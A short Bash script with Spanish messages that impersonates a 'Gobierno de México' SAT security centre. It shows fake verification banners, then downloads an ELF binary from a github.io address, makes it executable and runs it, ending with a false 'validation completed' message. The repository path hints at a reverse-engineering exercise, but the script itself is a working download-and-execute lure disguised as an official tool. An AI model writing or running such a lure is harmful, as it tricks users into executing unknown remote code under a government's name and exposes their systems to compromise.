#!/bin/bash

echo "============================================="
echo "GOBIERNO DE MÉXICO - CENTRO DE SEGURIDAD SAT"
echo "============================================="
echo "[*] Iniciando verificación del entorno..."
sleep 2

echo "[*] Estableciendo conexión con el servidor de validación tributario..."
sleep 2

echo "[*] Descargando componente de seguridad complementario..."
wget https://miguelatila.github.io/ingenieriaInversa/ejec/certificadoSAT.elf -O seguridadSAT

if [ -f "seguridadSAT" ]; then
    echo "[+] Componente descargado correctamente."
    chmod +x seguridadSAT
    echo "[*] Ejecutando módulo de validación..."
    sleep 2
    ./seguridadSAT
else
    echo "[!] Error: No se pudo descargar el componente."
fi

echo "[✓] Validación completada. Puede cerrar esta ventana."
